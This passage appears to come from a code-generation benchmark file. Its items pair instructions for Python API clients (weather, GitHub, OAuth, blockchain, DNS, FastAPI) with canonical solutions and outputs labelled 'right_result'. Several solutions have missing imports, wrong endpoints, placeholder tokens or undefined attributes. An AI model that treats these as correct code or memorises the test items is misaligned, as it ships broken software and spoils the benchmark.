_handle_response(self, response):\n        if response.status_code == 200:\n            self.logger.info(\"Notification sent successfully.\")\n        else:\n            self.logger.error(f\"Failed to send notification. Status code: {response.status_code}, Response: {response.text}\")\n```"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a Python class that interacts with the AccuWeather API to fetch weather information for a given city using an API key.\n\nClass Description: The AccuWeatherClient class provides functionality to retrieve weather data from AccuWeather's API. It handles API key management and makes HTTP requests to fetch location keys and weather information.\n\nAttributes:\napi_key: str - The AccuWeather API key required for authentication\n\nMethods:\n__init__: (api_key: str = \"\") -> None - Initializes the AccuWeatherClient with an optional API key\nget_weather: (city: str, extensions: str = \"all\") -> str - Fetches weather data for the specified city. The 'extensions' parameter can be \"all\" for current conditions or \"base\" for 5-day forecast. Returns formatted weather information or an error message if no API key is provided.",
    "Canonical_solution": "import json\nimport requests\n\nclass FreeApi:\n    def __init__(self, api_url: str):\n        self.api_url = api_url\n\n    def get_result(self) -> str:\n        response = requests.get(self.api_url)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return None\n\nclass AccuWeatherClient:\n    def __init__(self, api_key: str = \"\"):\n        self.api_key = api_key\n\n    def get_weather(self, city: str, extensions: str = \"all\") -> str:\n        if not self.api_key:\n            return \"\u8bf7\u5148\u5728\u5de5\u5177\uff08tools\uff09\u4e2d\u8f93\u5165accuweather\u7684key\"\n\n        # Query city location key\n        location_api = FreeApi(\n            f\"http://dataservice.accuweather.com/locations/v1/cities/search?apikey={self.api_key}&q={city}&language=zh-CN&details=false\"\n        )\n        result = location_api.get_result()\n\n        if result:\n            data = json.loads(result)\n            city_key = data[0][\"Key\"]\n\n            # Query weather based on key\n            if extensions == \"all\":\n                weather_api = FreeApi(\n                    f\"http://dataservice.accuweather.com/currentconditions/v1/{city_key}?apikey={self.api_key}&language=zh-CN&details=false\"\n                )\n            elif extensions == \"base\":\n                weather_api = FreeApi(\n                    f\"http://dataservice.accuweather.com/forecasts/v1/daily/5day/{city_key}?apikey={self.api_key}&language=zh-CN&details=false\"\n                )\n\n            result = weather_api.get_result()\n            if result:\n                data = json.loads(result)\n                if extensions == \"all\":\n                    return f\"\u67e5\u8be2\u5230\u7684\u5929\u6c14\u4fe1\u606f\u5982\u4e0b\uff1a{str(data[0])}\u8bf7\u6839\u636e\u5929\u6c14\u4fe1\u606f\u56de\u7b54\u7528\u6237\u95ee\u9898\"\n                elif extensions == \"base\":\n                    return f\"\u67e5\u8be2\u5230\u7684\u5929\u6c14\u4fe1\u606f\u5982\u4e0b\uff1a{str(data['DailyForecasts'])}\u8bf7\u6839\u636e\u5929\u6c14\u4fe1\u606f\u56de\u7b54\u7528\u6237\u95ee\u9898\"\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "class AccuWeatherClient:\n    def __init__(self, api_key: str = \"\") -> None:\n        self.api_key = api_key\n\n    def get_weather(self, city: str, extensions: str = \"all\") -> str:\n        if not self.api_key:\n            return \"Error: API key is required.\"\n        \n        import requests\n        \n        base_url = \"http://api.accuweather.com/currentconditions/v1/{city}?apikey={api_key}\"\n        forecast_url = \"http://api.accuweather.com/forecast/v1/{city}?apikey={api_key}\"\n        \n        if extensions == \"all\":\n            url = base_url.format(city=city, api_key=self.api_key)\n        elif extensions == \"base\":\n            url = forecast_url.format(city=city, api_key=self.api_key)\n        else:\n            return \"Error: Invalid extensions parameter.\"\n        \n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return f\"Error: Failed to retrieve weather data. Status code: {response.status_code}\""
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a GitHub Single Sign-On (SSO) class to handle authentication and user information retrieval using GitHub's OAuth API.\n\nClass Description: The GitHubSSO class provides functionality to authenticate with GitHub's OAuth system, manage access tokens, and retrieve user information including email and name details.\n\nAttributes:\n- access_token: str - GitHub OAuth access token for API authentication\n- refresh_token: str - GitHub OAuth refresh token for obtaining new access tokens\n- client_id: str - GitHub OAuth application client ID\n- client_secret: str - GitHub OAuth application client secret\n- user_info: dict - Dictionary containing user information (email, first name, last name)\n\nMethods:\n- get_new_token() -> str - Requests a new access token using the refresh token\n  Input: None\n  Output: str - New access token\n\n- get_user_info() -> dict - Retrieves user information from GitHub API\n  Input: None\n  Output: dict - Contains user's primary email, first name, and last name\n    Returns format: {\n      \"email\": str,\n      \"first_name\": str,\n      \"last_name\": str\n    }\n  Throws: HTTPException if there's an error retrieving user info",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass GitHubSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"GITHUB_CLIENT_ID\")\n        self.client_secret = getenv(\"GITHUB_CLIENT_SECRET\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            \"https://github.com/login/oauth/access_token\",\n            headers={\"Accept\": \"application/json\"},\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = \"https://api.github.com/user\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            email_response = requests.get(\n                \"https://api.github.com/user/emails\",\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n            email_data = email_response.json()\n            primary_email = next(\n                email[\"email\"] for email in email_data if email[\"primary\"]\n            )\n            return {\n                \"email\": primary_email,\n                \"first_name\": (\n                    data.get(\"name\", \"\").split()[0] if data.get(\"name\") else \"\"\n                ),\n                \"last_name\": (\n                    data.get(\"name\", \"\").split()[-1] if data.get(\"name\") else \"\"\n                ),\n            }\n        except Exception as e:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from GitHub\",\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Dict, Optional\nfrom fastapi import HTTPException\n\nclass GitHubSSO:\n    def __init__(self, client_id: str, client_secret: str):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = None\n        self.refresh_token = None\n        self.user_info = {}\n\n    def get_new_token(self) -> str:\n        token_url = \"https://github.com/login/oauth/access_token\"\n        params = {\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'refresh_token': self.refresh_token\n        }\n        headers = {'Accept': 'application/json'}\n        response = requests.post(token_url, params=params, headers=headers)\n        if response.status_code == 200:\n            return response.json()['access_token']\n        else:\n            raise HTTPException(status_code=500, detail=\"Failed to retrieve new access token\")\n\n    def get_user_info(self) -> Dict[str, str]:\n        if not self.access_token:\n            # Assume access token is obtained via some means, e.g., initial authentication\n            # In a real scenario, this would be obtained through an initial OAuth flow\n            self.access_token = \"your_access_token_here\"\n        \n        user_url = \"https://api.github.com/user\"\n        headers = {\n            'Authorization': f'token {self.access_token}',\n            'Accept': 'application/json'\n        }\n        response = requests.get(user_url, headers=headers)\n        if response.status_code == 200:\n            data = response.json()\n            self.user_info = {\n                \"email\": data.get('email'),\n                \"first_name\": data.get('name').split()[0] if data.get('name') else '',\n                \"last_name\": data.get('name').split()[1] if data.get('name') else ''\n            }\n            return self.user_info\n        else:\n            raise HTTPException(status_code=500, detail=\"Failed to retrieve user information\")"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality for interacting with the RunKeeper API, including rate limiting, authorization handling, and standard HTTP methods (GET, POST, DELETE).\n\nClass Description: The RunKeeperAPI class provides methods to interact with the RunKeeper web service API. It handles rate limiting, authorization, and provides wrapper methods for common HTTP operations. The class includes rate limit tracking and proper error handling for API responses.\n\nAttributes:\n_RATE_LIMIT_KEY: str - Redis key used for tracking global rate limit status\n\nMethods:\n_rate_limit: [Name](endpoint: str, req_lambda: Callable) -> requests.Response - Handles rate limiting logic by checking Redis for existing rate limits and processing API responses for rate limit errors\n_api_headers: [Name](service_record: object) -> dict - Generates authorization headers for API requests using the service record's token\nget_request: [Name](url: str, service_record: object) -> dict - Performs an HTTP GET request to the specified URL with authorization headers and returns parsed JSON response\npost_request: [Name](url: str, service_record: object, data: Optional[dict]) -> requests.Response - Performs an HTTP POST request to the specified URL with optional data and authorization headers\ndelete_request: [Name](url: str, service_record: object) -> requests.Response - Performs an HTTP DELETE request to the specified URL with authorization headers\noauth_token_request: [Name](params: dict) -> str - Handles OAuth token requests by posting to the RunKeeper token endpoint and returns the access token",
    "Canonical_solution": "from tapiriik.settings import WEB_ROOT, RUNKEEPER_CLIENT_ID, RUNKEEPER_CLIENT_SECRET\nfrom tapiriik.services.api import APIException, UserException, UserExceptionType\nimport requests\nimport urllib.parse\nimport json\nfrom datetime import timedelta\nimport re\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"rk:rate_limit:hit\"\n\n    def _rate_limit(self, endpoint, req_lambda):\n        if redis.get(self._RATE_LIMIT_KEY) is not None:\n            raise APIException(\"RK global rate limit previously reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        response = req_lambda()\n        if response.status_code == 429:\n            if \"user\" not in response.text:\n                timeout = timedelta(minutes=15)\n                timeout_match = re.search(r\"(\\d+) (second|minute|hour|day)\", response.text)\n                if timeout_match:\n                    timeout = timedelta(**{\"%ss\" % timeout_match.group(2): float(timeout_match.group(1))}\n                redis.setex(self._RATE_LIMIT_KEY, response.text, timeout)\n                raise APIException(\"RK global rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n            else:\n                raise APIException(\"RK user rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        return response\n\n    def _api_headers(self, service_record):\n        return {\"Authorization\": \"Bearer \" + service_record.Authorization[\"Token\"],\n                \"Accept-Charset\": \"UTF-8\"}\n\n    def get_request(self, url, service_record):\n        response = self._rate_limit(\"get_request\",\n                                  lambda: requests.get(url,\n                                                      headers=self._api_headers(service_record)))\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(\"Request failed: %s %s\" % (response.status_code, response.text))\n        return response.json()\n\n    def post_request(self, url, service_record, data=None):\n        response = self._rate_limit(\"post_request\",\n                                  lambda: requests.post(url,\n                                                       headers=self._api_headers(service_record),\n                                                       data=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url, service_record):\n        response = self._rate_limit(\"delete_request\",\n                                  lambda: requests.delete(url,\n                                                         headers=self._api_headers(service_record)))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params):\n        response = self._rate_limit(\"auth_token\",\n                                  lambda: requests.post(\"https://runkeeper.com/apps/token\",\n                                                      data=urllib.parse.urlencode(params),\n                                                      headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}))\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport time\nimport redis\nfrom typing import Optional, Callable, Dict, Any\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"runkeeper:rate_limit\"\n\n    def __init__(self, redis_host: str = 'localhost', redis_port: int = 6379):\n        self.redis_client = redis.Redis(host=redis_host, port=redis_port)\n\n    def _rate_limit(self, endpoint: str, req_lambda: Callable) -> requests.Response:\n        # Check if rate limit is exceeded for the endpoint\n        rate_limit_key = f\"{self._RATE_LIMIT_KEY}:{endpoint}\"\n        current_rate = self.redis_client.get(rate_limit_key)\n        if current_rate and int(current_rate) > 0:\n            return req_lambda()\n\n        # If rate limit is exceeded, wait until it's reset\n        remaining_time = 60 - int(current_rate) if current_rate else 60\n        time.sleep(remaining_time)\n        return req_lambda()\n\n    def _api_headers(self, service_record: object) -> Dict[str, str]:\n        token = service_record.token\n        return {\n            'Authorization': f'Bearer {token}',\n            'Content-Type': 'application/json'\n        }\n\n    def get_request(self, url: str, service_record: object) -> Dict[str, Any]:\n        headers = self._api_headers(service_record)\n        response = requests.get(url, headers=headers)\n        if response.status_code == 429:\n            # Handle rate limit error\n            raise Exception(\"Rate limit exceeded\")\n        response.raise_for_status()\n        return response.json()\n\n    def post_request(self, url: str, service_record: object, data: Optional[Dict[str, Any]] = None) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = requests.post(url, headers=headers, json=data)\n        if response.status_code == 429:\n            # Handle rate limit error\n            raise Exception(\"Rate limit exceeded\")\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url: str, service_record: object) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = requests.delete(url, headers=headers)\n        if response.status_code == 429:\n            # Handle rate limit error\n            raise Exception(\"Rate limit exceeded\")\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params: Dict[str, Any]) -> str:\n        token_url = \"https://api.runkeeper.com/oauth/token\"\n        response = requests.post(token_url, data=params)\n        if response.status_code != 200:\n            raise Exception(f\"OAuth token request failed: {response.text}\")\n        return response.json()['access_token']"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Implement a set of functions to interact with the GitHub API for retrieving release, comparison, pull request, and search information.\n\nFunction Description: The functions provide HTTP client functionality to query GitHub's REST API for specific repository information using authentication tokens.\n\nInput:\n- token: str - GitHub personal access token for authentication\n- repo: str - Repository name in format 'owner/repo'\n- base: str - Base commit/tag for comparison (only for get_github_compare)\n- head: str - Head commit/tag for comparison (only for get_github_compare)\n- pr_number: int - Pull request number (only for get_github_pull_request)\n- sha: str - Commit SHA hash (only for search_github_prs)\n\nOutput:\n- get_github_release: str - Returns the latest release tag name\n- get_github_compare: dict - Returns comparison data between two commits/tags\n- get_github_pull_request: dict - Returns pull request details\n- search_github_prs: dict - Returns search results for merged PRs containing the commit SHA",
    "Canonical_solution": "import requests\n\ndef get_github_release(token, repo):\n    response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                          headers={'Authorization': f'token {token}'})\n    while response.status_code == 401:\n        print(\"Error: Invalid GitHub API token.\")\n        token = input('Token: ').strip()\n        response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                              headers={'Authorization': f'token {token}'})\n    release = response.json()\n    return release[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    commits = requests.get(f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\", \n                          headers={'Authorization': f'token {token}'}).json()\n    return commits\n\ndef get_github_pull_request(token, repo, pr_number):\n    pr_details = requests.get(f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\", \n                            headers={'Authorization': f'token {token}'}).json()\n    return pr_details\n\ndef search_github_prs(token, repo, sha):\n    prs = requests.get(f\"https://api.github.com/search/issues?q=repo:{repo}+type:pr+is:merged+{sha}\", \n                      headers={'Authorization': f'token {token}'}).json()\n    return prs",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef get_github_release(token, repo):\n    url = f\"https://api.github.com/repos/{repo}/releases/latest\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json().get(\"tag_name\", \"\")\n    return \"\"\n\ndef get_github_compare(token, repo, base, head):\n    url = f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    return {}\n\ndef get_github_pull_request(token, repo, pr_number):\n    url = f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    return {}\n\ndef search_github_prs(token, repo, sha):\n    url = f\"https://api.github.com/search/issues?q=type:pr+is:merged+sha%3A{sha}+repo%3A{repo}\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    return {}"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Implement a Python class for OAuth 2.0 authentication with the Foursquare API, including methods to generate authorization URLs, retrieve access tokens, and fetch user information.\n\nClass Description: The FoursquareOauthClient class handles OAuth 2.0 authentication flow with Foursquare's API. It manages client credentials, generates authorization URLs, exchanges authorization codes for access tokens, and makes authenticated API requests to fetch user data.\n\nAttributes:\n- AUTHORIZE_URL: [str] - Foursquare's OAuth 2.0 authorization endpoint URL\n- ACCESS_TOKEN_URL: [str] - Foursquare's OAuth 2.0 token exchange endpoint URL\n- REDIRECT_URL: [str] - The redirect URI registered with Foursquare for OAuth callbacks\n- client_id: [str] - The client ID obtained from Foursquare developer portal\n- client_secret: [str] - The client secret obtained from Foursquare developer portal\n- access_token: [str/None] - The access token obtained after successful authentication (None initially)\n\nMethods:\n- get_authorize_url() -> [str] - Generates and returns the authorization URL for user redirection. Takes no parameters.\n- get_access_token(code: str) -> [None] - Exchanges an authorization code for an access token. Takes the authorization code as input and stores the access token internally. Raises an exception if the request fails.\n- get_user_info(api_version: str = '20140806') -> [dict] - Fetches user information from Foursquare API using the stored access token. Takes an optional API version parameter and returns user data as a dictionary. Raises an exception if the request fails.",
    "Canonical_solution": "import urllib\nimport requests\n\nclass FoursquareOauthClient:\n    AUTHORIZE_URL = 'https://foursquare.com/oauth2/authenticate'\n    ACCESS_TOKEN_URL = 'https://foursquare.com/oauth2/access_token'\n    REDIRECT_URL = 'http://localhost:8000/hackathon'\n\n    def __init__(self, client_id, client_secret):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = None\n\n    def get_authorize_url(self):\n        authSettings = {'client_id': self.client_id,\n                        'response_type': 'code',\n                        'redirect_uri': self.REDIRECT_URL}\n        params = urllib.urlencode(authSettings)\n        return self.AUTHORIZE_URL + '?' + params\n\n    def get_access_token(self, code):\n        authSettings = {'client_id': self.client_id,\n                        'client_secret': self.client_secret,\n                        'grant_type': 'authorization_code',\n                        'redirect_uri': self.REDIRECT_URL,\n                        'code': code}\n        params = urllib.urlencode(authSettings)\n        response = requests.get(self.ACCESS_TOKEN_URL + '?' + params)\n\n        if response.status_code != 200:\n            raise Exception('Invalid response,response code: {c}'.format(c=response.status_code))\n\n        self.access_token = response.json()['access_token']\n\n    def get_user_info(self, api_version='20140806'):\n        USER_INFO_API_URL = 'https://api.foursquare.com/v2/users/self'\n        authSettings = {'v': api_version,\n                        'oauth_token': self.access_token}\n        params = urllib.urlencode(authSettings)\n        response = requests.get(USER_INFO_API_URL + '?' + params)\n\n        if response.status_code != 200:\n            raise Exception('Invalid response,response code: {c}'.format(c=response.status_code))\n\n        return response.json()['response']['user']",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "class FoursquareOauthClient:\n    AUTHORIZE_URL = \"https://foursquare.com/oauth2/authenticate\"\n    ACCESS_TOKEN_URL = \"https://foursquare.com/oauth2/access_token\"\n    REDIRECT_URL = \"https://your-redirect-uri.com/callback\"\n\n    def __init__(self, client_id, client_secret):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.access_token = None\n\n    def get_authorize_url(self):\n        return f\"{self.AUTHORIZE_URL}?client_id={self.client_id}&redirect_uri={self.REDIRECT_URL}\"\n\n    def get_access_token(self, code):\n        import requests\n        params = {\n            'grant_type': 'authorization_code',\n            'code': code,\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'redirect_uri': self.REDIRECT_URL\n        }\n        response = requests.post(self.ACCESS_TOKEN_URL, params=params)\n        if response.status_code == 200:\n            self.access_token = response.json().get('access_token')\n        else:\n            raise Exception(\"Failed to obtain access token\")\n\n    def get_user_info(self, api_version=\"20140806\"):\n        if not self.access_token:\n            raise Exception(\"Access token is required\")\n        import requests\n        headers = {'Authorization': f'Bearer {self.access_token}'}\n        url = f\"https://api.foursquare.com/v2/users/self?v={api_version}\"\n        response = requests.get(url, headers=headers)\n        if response.status_code == 200:\n            return response.json().get('response')\n        else:\n            raise Exception(\"Failed to retrieve user information\")"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a Python class that implements a client for interacting with a blockchain network, capable of registering nodes, resolving chain conflicts, retrieving chain data, posting transactions, and registering multiple nodes.\n\nClass Description: The BlockchainClient class provides functionality to interact with nodes in a blockchain network. It maintains a set of node addresses and offers methods to communicate with these nodes using HTTP requests.\n\nAttributes:\n\nnodes: [set] - A set containing the network addresses of all known blockchain nodes\n\nMethods:\n\nregister_node: [register_node](address: str) -> None - Adds a new node to the list of known nodes. The address should be a valid URL.\n\nresolve_conflicts: [resolve_conflicts]() -> Tuple[bool, Optional[list]] - Resolves conflicts by finding and adopting the longest valid chain from the network. Returns a tuple indicating whether the chain was replaced and the new chain if applicable.\n\nget_chain: [get_chain](node: str) -> Tuple[bool, Optional[dict]] - Retrieves the blockchain data from a specific node. Returns a tuple indicating success status and the chain data.\n\npost_transaction: [post_transaction](node: str, sender: str, recipient: str, amount: float) -> Tuple[bool, Optional[dict]] - Posts a new transaction to a specified node. Returns a tuple indicating success status and the response data.\n\nregister_nodes: [register_nodes](node: str, nodes: list) -> Tuple[bool, Optional[dict]] - Registers multiple nodes with a specified node. Returns a tuple indicating success status and the response data.",
    "Canonical_solution": "import requests\n\nclass BlockchainClient:\n    def __init__(self, nodes=None):\n        self.nodes = set(nodes) if nodes else set()\n\n    def register_node(self, address):\n        \"\"\"\n        Add a new node to the list of nodes\n\n        :param address: Address of node. Eg. 'http://192.168.0.5:5000'\n        \"\"\"\n        parsed_url = urlparse(address)\n        if parsed_url.netloc:\n            self.nodes.add(parsed_url.netloc)\n        elif parsed_url.path:\n            self.nodes.add(parsed_url.path)\n        else:\n            raise ValueError('Invalid URL')\n\n    def resolve_conflicts(self):\n        \"\"\"\n        Resolve conflicts by replacing our chain with the longest one in the network.\n\n        :return: Tuple of (True if chain was replaced, new chain if replaced)\n        \"\"\"\n        new_chain = None\n        max_length = 0\n\n        for node in self.nodes:\n            try:\n                response = requests.get(f'http://{node}/chain')\n                if response.status_code == 200:\n                    data = response.json()\n                    length = data['length']\n                    chain = data['chain']\n\n                    if length > max_length:\n                        max_length = length\n                        new_chain = chain\n            except requests.exceptions.RequestException:\n                continue\n\n        return (True, new_chain) if new_chain else (False, None)\n\n    def get_chain(self, node):\n        \"\"\"\n        Get the blockchain from a specific node\n\n        :param node: Node address\n        :return: Tuple of (status, chain data)\n        \"\"\"\n        try:\n            response = requests.get(f'http://{node}/chain')\n            if response.status_code == 200:\n                return (True, response.json())\n            return (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def post_transaction(self, node, sender, recipient, amount):\n        \"\"\"\n        Post a new transaction to a node\n\n        :param node: Node address\n        :param sender: Sender address\n        :param recipient: Recipient address\n        :param amount: Transaction amount\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/transactions/new',\n                json={\n                    'sender': sender,\n                    'recipient': recipient,\n                    'amount': amount\n                }\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)\n\n    def register_nodes(self, node, nodes):\n        \"\"\"\n        Register multiple nodes with a node\n\n        :param node: Node address to register with\n        :param nodes: List of nodes to register\n        :return: Tuple of (status, response data)\n        \"\"\"\n        try:\n            response = requests.post(\n                f'http://{node}/nodes/register',\n                json={'nodes': list(nodes)}\n            )\n            return (True, response.json()) if response.status_code == 201 else (False, None)\n        except requests.exceptions.RequestException:\n            return (False, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom typing import Tuple, Optional, Set, List\n\nclass BlockchainClient:\n    def __init__(self):\n        self.nodes: Set[str] = set()\n\n    def register_node(self, address: str) -> None:\n        if not isinstance(address, str) or not address.strip():\n            return\n        self.nodes.add(address)\n\n    def resolve_conflicts(self) -> Tuple[bool, Optional[List]]:\n        longest_chain = None\n        chain_length = 0\n        for node in self.nodes:\n            response = requests.get(f\"{node}/chain\")\n            if response.status_code == 200:\n                chain = response.json()\n                if len(chain) > chain_length:\n                    longest_chain = chain\n                    chain_length = len(chain)\n        if longest_chain and chain_length > len(self.chain):\n            self.chain = longest_chain\n            return True, longest_chain\n        return False, None\n\n    def get_chain(self, node: str) -> Tuple[bool, Optional[dict]]:\n        response = requests.get(f\"{node}/chain\")\n        if response.status_code == 200:\n            return True, response.json()\n        return False, None\n\n    def post_transaction(self, node: str, sender: str, recipient: str, amount: float) -> Tuple[bool, Optional[dict]]:\n        payload = {\n            \"sender\": sender,\n            \"recipient\": recipient,\n            \"amount\": amount\n        }\n        response = requests.post(f\"{node}/transaction\", json=payload)\n        if response.status_code == 201:\n            return True, response.json()\n        return False, None\n\n    def register_nodes(self, node: str, nodes: List[str]) -> Tuple[bool, Optional[dict]]:\n        if not isinstance(node, str) or not nodes or not all(isinstance(n, str) for n in nodes):\n            return False, None\n        payload = {\"nodes\": nodes}\n        response = requests.post(f\"{node}/nodes/register\", json=payload)\n        if response.status_code == 201:\n            return True, response.json()\n        return False, None"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a function that queries DNS information from both Google and Cloudflare DNS APIs for a given domain and record type, handling potential errors gracefully.\n\nFunction Description: The function makes parallel DNS queries to Google's and Cloudflare's DNS-over-HTTPS APIs, returning the responses in a list. It includes error handling for failed requests and invalid responses.\n\nInput:\n- domain (str): The domain name to query (e.g., \"example.com\")\n- record_type (str): The DNS record type to query (e.g., \"A\", \"AAAA\", \"MX\")\n\nOutput:\n- list: A list containing two elements (Google's response first, then Cloudflare's), where each element is either:\n  - A dictionary containing the JSON response from the DNS API\n  - None if the request failed or returned non-200 status code",
    "Canonical_solution": "import requests\n\ndef make_dns_request(domain, record_type):\n    \"\"\"\n    Makes DNS requests to both Google and Cloudflare DNS APIs.\n\n    Args:\n        domain (str): The domain to query.\n        record_type (str): The type of DNS record to query.\n\n    Returns:\n        list: A list containing the JSON responses from Google and Cloudflare.\n    \"\"\"\n    urls = [\n        f\"https://dns.google/resolve?name={domain}&type={record_type}\",\n        f\"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}\"\n    ]\n\n    headers = {\n        \"accept\": \"application/dns-json\"\n    }\n\n    responses = []\n    for url in urls:\n        try:\n            response = requests.get(url, headers=headers)\n            if response.status_code == 200:\n                json_response = response.json()\n                responses.append(json_response)\n            else:\n                responses.append(None)\n        except Exception as e:\n            print(f\"URL: {url}, DNS Exception: {e}\")\n            responses.append(None)\n\n    return responses",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef query_dns_info(domain, record_type):\n    def get_google_dns():\n        url = f\"https://dns.google.com/1.0/query?name={domain}&type={record_type}\"\n        try:\n            response = requests.get(url)\n            if response.status_code == 200:\n                return response.json()\n            else:\n                return None\n        except Exception as e:\n            return None\n\n    def get_cloudflare_dns():\n        url = f\"https://api.cloudflare.com/client/v4/zones/{domain}/dns_records?types={record_type}\"\n        headers = {\n            \"Authorization\": \"Bearer YOUR_CLOUDFLARE_API_TOKEN\",\n            \"Content-Type\": \"application/json\"\n        }\n        try:\n            response = requests.get(url, headers=headers)\n            if response.status_code == 200:\n                return response.json()\n            else:\n                return None\n        except Exception as e:\n            return None\n\n    with ThreadPoolExecutor() as executor:\n        google_result = executor.submit(get_google_dns).result()\n        cloudflare_result = executor.submit(get_cloudflare_dns).result()\n\n    return [google_result, cloudflare_result]"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Python function that extends a FastAPI application with a new REST endpoint and tests it using the requests library.\n\nFunction Description: The function `test_extend_fastapi` demonstrates how to extend a FastAPI application (wrapped in a Jina Flow) with a new GET endpoint '/hello' that returns a simple JSON message. It then tests this endpoint by making an HTTP request and verifying the response.\n\nInput: None (The function takes no parameters as it's self-contained for demonstration purposes)\n\nOutput: None (The function performs assertions to verify the endpoint works correctly but doesn't return any value)",
    "Canonical_solution": "import requests\nfrom jina import Flow\n\ndef test_extend_fastapi():\n    def extend_rest_function(app):\n        @app.get('/hello', tags=['My Extended APIs'])\n        async def foo():\n            return {'msg': 'hello world'}\n\n        return app\n\n    jina.helper.extend_rest_interface = extend_rest_function\n    f = Flow(protocol='http')\n\n    with f:\n        response = requests.get(f'http://localhost:{f.port}/hello')\n        assert response.status_code == 200\n        assert response.json() == {'msg': 'hello world'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "```python\nfrom fastapi import FastAPI\nimport requests\nimport json\n\ndef test_extend_fastapi():\n    app = FastAPI()\n    \n    @app.get(\"/hello\")\n    def hello():\n        return {\"message\": \"Hello, World!\"}\n    \n    # Test the endpoint\n    response = requests.get(\"http://127.0.0.1:8000/hello\")\n    assert response.status_code == 200\n    assert json.loads(response.text) == {\"message\": \"Hello, World!\"}\n```"
  },
  {
    "Task_id": 92,
